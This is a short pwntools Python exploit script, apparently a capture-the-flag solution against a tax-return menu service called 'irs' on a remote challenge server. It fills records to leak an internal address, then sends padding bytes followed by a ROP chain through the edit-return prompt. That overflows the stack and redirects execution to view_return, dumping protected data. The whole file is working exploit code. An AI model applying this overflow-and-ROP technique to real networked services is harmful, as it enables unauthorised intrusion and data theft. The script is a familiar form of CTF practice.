from pwn import *

context(arch = 'i386', os = 'linux')

next_id = 1

def file_tax_return(tube):
    global next_id

    name = 'Badger{}'.format(next_id)
    next_id += 1

    tube.sendline('1')

    tube.recvregex('Enter the name: ')
    tube.sendline(name)

    tube.recvregex('Enter the password: ')
    tube.sendline('badger1234')

    tube.recvregex('Enter the income: ')
    tube.sendline('1')

    tube.recvregex('Enter the deductions: ')
    tube.sendline('1')

    tube.recvregex(name)

with context.local(log_level='debug'):
    #tube = process('./irs')
    tube = remote('irs.pwn.republican', 4127)

    tube.recvline_contains('0 - Donald Trump')

    file_tax_return(tube)
    file_tax_return(tube)
    file_tax_return(tube)
    file_tax_return(tube)

    tube.sendline('1')
    line = tube.recvline_regex('.+ contact us at this address: 0x.+$', exact=True)
    taxes_address = int(line.split(' ')[-1], 16)

    tube.sendline('3')
    tube.recvregex('Enter the name of the file to edit: ')
    tube.sendline('Badger1')
    tube.recvregex('Enter the password: ')
    tube.sendline('badger1234')
    tube.recvregex('Enter the new income: ')
    tube.sendline('1')
    tube.recvregex('Enter the new deductible: ')
    tube.sendline('1')
    tube.recvregex('y/n\r\n')

    elf = ELF('./irs')
    rop = ROP(elf)

    rop.call('view_return', (taxes_address, 0))

    payload = 25 * '0'
    payload += str(rop)
    payload += '\n'

    tube.send(payload)

    tube.recvregex('Your changes have been recorded!\r\n')

    result = tube.recvall()
    print result
